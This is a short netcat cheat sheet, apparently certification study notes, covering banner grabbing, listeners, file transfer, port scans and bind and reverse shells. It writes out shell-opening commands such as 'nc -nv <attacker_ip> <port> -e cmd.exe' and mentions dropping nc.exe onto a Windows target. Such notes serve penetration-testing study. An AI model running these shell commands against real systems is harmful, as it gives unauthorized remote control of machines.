---
title: "Netcat: the TCP/IP swiss-army knife"
description: "Banner grabbing, port scanning, file transfer, and bind/reverse shells."
pubDate: 2026-11-11
category: "Cybersecurity"
source: "INE Certification"
lang: "bash"
tags: ["netcat", "shells"]
draft: false
---

Netcat reads and writes raw TCP/UDP connections, which lets it do banner grabbing, quick port checks, file transfers, and handle both ends of a bind or reverse shell.

## Connect and listen

```bash
# Connect / banner grab
nc <target_ip> <port>

# Listener
nc -nvlp <port>            # n=no DNS, v=verbose, l=listen, p=port
```

## File transfer

```bash
nc -nvlp <port> > received_file      # receiver
nc -nv <ip> <port> < file_to_send    # sender
```

## Shells

```bash
# Bind shell (listener runs ON the target)
nc -nvlp <port> -e cmd.exe           # Windows target
nc -nvlp <port> -c /bin/bash         # Linux target (-c is the Linux-only equivalent of -e)

# Reverse shell (attacker listens, target connects out)
nc -nv <attacker_ip> <port> -e cmd.exe
```

:::warning[Exec-capable netcat is a soft target]
`-e`/`-c` are what make bind/reverse shells possible, so treat any box with an exec-capable netcat installed as a soft target.
:::

## Other modes

| Option | Use |
| --- | --- |
| `-z` | Bare-bones port scan: `nc -zv <target> <port-range>` |
| `-e` / `-c` | Execute a program on connection (shells) |

Kali keeps a portable `nc.exe` under `/usr/share/windows-binaries` for when you need to drop it onto a Windows target.

## Related

- [Bind shells and reverse shells](/snippets/cybersecurity/exploitation/post-exploitation-persistence/bind-reverse-shells): when to use which direction, on Windows and Linux
- [Upgrading a shell session to Meterpreter](/snippets/cybersecurity/exploitation/post-exploitation-persistence/shell-to-meterpreter-upgrade): promote a netcat shell
- [Nmap](/snippets/cybersecurity/tools/scanning-enumeration-tools/nmap): proper port scanning when `-z` isn't enough
- [msfvenom](/snippets/cybersecurity/tools/exploitation-frameworks/msfvenom): payloads for when netcat isn't available
